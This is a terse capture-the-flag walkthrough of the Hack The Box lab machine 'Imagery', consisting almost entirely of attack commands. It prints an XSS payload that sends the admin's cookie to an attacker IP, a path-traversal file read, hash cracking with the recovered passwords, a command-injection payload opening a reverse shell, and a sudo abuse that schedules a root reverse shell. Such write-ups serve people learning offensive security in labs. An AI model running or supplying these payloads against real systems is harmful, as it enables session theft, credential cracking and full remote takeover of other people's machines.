
**HTB Imagery**

`10.10.11.88`

nmap

```
PORT     STATE SERVICE
22/tcp   open  ssh
8000/tcp open  http-alt
```

scan date - 2025-10-03

registered normal user on web app (port 8000)

Report Bug feature found

`"Bug report submitted. Admin review in progress"`

xss payload

`<img src=x onerror="this.src='http://10.10.14.5/?cookie='+document.cookie">`

admin opened report - cookie captured

`.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-...............-pb2RqE50Dur1L9XiRY0`

used admin cookie -> log download feature -> LFI

app.py config

`DATA_STORE_PATH = 'db.json'`

`UPLOAD_FOLDER = 'uploads'`

`SYSTEM_LOG_FOLDER = 'system_logs'`

LFI path used

`../../../../../../../../home/web/web/db.json`

db.json (excerpt)

```
admin@imagery.htb : 5d9c1d507a3f76af1e5c97a3ad1eaa31 (isAdmin true)
testuser@imagery.htb : 2c65c8d7bfbca32a3ed42596192384f6 (isAdmin false)
```

hashcat

`hashcat -m 900 -a 0 hashes.txt rockyou.txt`

cracked - testuser : iambatman

logged in as testuser@imagery.htb

crop endpoint - command injection found

```python
command = f"{IMAGEMAGICK_CONVERT_PATH} {original_filepath} -crop {width}x{height}+{x}+{y} {output_filepath}"
subprocess.run(command, capture_output=True, text=True, shell=True)
```

x param payload

`";setsid /bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.14.5/4444 0>&1';`

listener

`rlwrap nc -lvnp 4444`

shell as web app user - connected

enumerated filesystem -> backup/ dir found

file - `web_20250806_120723.zip.aes`

`perl aescrypt2hashcat.pl web_20250806_120723.zip.aes > aes_hash.txt`

`hashcat -m <mode> aes_hash.txt rockyou.txt`

cracked - bestfriends

`aescrypt -d web_20250806_120723.zip.aes`

`unzip web_20250806_120723.zip`

db.json #2 (inside archive)

```
mark@imagery.htb : 01c3d2e5bdaf6134cec0a367cf53e535
displayId: 868facaf
isAdmin: false
```

cracked - mark : supersmash

`sudo -l`

```
(ALL) NOPASSWD: /usr/local/bin/charcol
```

`sudo /usr/local/bin/charcol -R`

`charcol shell`

inside charcol shell

`auto add --schedule "* * * * *" --command "bash -c 'bash -i >& /dev/tcp/10.10.14.5/4445 0>&1'" --name "bash" --log-output bash.sh`

listener

`rlwrap nc -lvnp 4445`

~1 min later - root shell connects back

root@imagery:~#

`id`

`uid=0(root) gid=0(root) groups=0(root)`
